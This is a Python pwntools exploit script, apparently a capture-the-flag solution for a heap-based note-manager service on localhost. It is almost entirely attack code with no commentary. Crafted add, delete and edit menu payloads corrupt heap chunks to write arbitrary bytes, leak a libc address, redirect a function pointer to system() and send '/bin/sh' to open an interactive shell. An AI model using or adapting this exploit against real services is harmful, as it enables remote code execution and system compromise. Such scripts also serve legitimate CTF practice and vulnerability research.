#!/usr/bin/python -i

from pwn import *
import random
context.log_level = "DEBUG"

Local = True

if Local:
    host = '127.0.0.1'
    port = 2323
    system_offset = 0x45390
    free_offset = 0x844f0
    stdout_offset = 0x3c5620
else:
    exit(-1)


def add_note(size, buf=''):
    p = '1\n'
    p += str(size) + '\n'
    p += buf
    assert len(buf) <= size - 1
    assert '\n' not in buf
    if len(buf) != size - 1:
        p += '\n'
    return p


def edit_note(idx, buf=''):
    p = '2\n'
    p += str(idx) + '\n'
    p += buf
    size = 64
    assert len(buf) <= size - 1
    assert '\n' not in buf
    if len(buf) != size - 1:
        p += '\n'
    return p


def list_note(idx):
    p = '3\n'
    p += str(idx) + '\n'
    return p


def del_note(idx):
    p = '4\n'
    p += str(idx) + '\n'
    return p


p = ''
p += add_note(0x8) * 8


def write_byte(idx1, addr, val):
    idx2 = random.randint(20000, 200000000)
    while '\n' in p32(idx2):
        idx2 = random.randint(20000, 200000000)
    p = ''
    p += del_note(idx1)
    p += add_note(0x100,
                  cyclic(68) + p64(0x61) + p64(addr - 0x8) +
                  p64(0x602800 + val) + p32(idx2))
    p += del_note(idx2)
    p += add_note(0x8)
    return p


p += write_byte(0, 0x6020c0, 0xcd)
p += write_byte(2, 0x6020c1, 0xab)
p += write_byte(4, 0x6020c2, 0x37)
p += write_byte(6, 0x6020c3, 0x13)

p += add_note(0x8) * 8

p += del_note(0x6028)
p += add_note(0x100, cyclic(68) + p64(0x61) + p64(0x60208c))
p += list_note(0)

#p+=

r = remote(host, port)
raw_input('continue ->')
r.send(p)

print r.recvuntil('Content: ')
libc_addr = int(r.recvuntil('\nYour')[:-5][::-1].encode('hex'),
                16) - stdout_offset
print 'libc addr:', hex(libc_addr)

p = ''

p += del_note(0x602a)
p += add_note(0x100, cyclic(68) + p64(0x61) + p64(0x60203c))

p += edit_note(libc_addr >> 32, p64(libc_addr + system_offset))
p += '/bin/sh;\n'
r.send(p)

r.interactive()
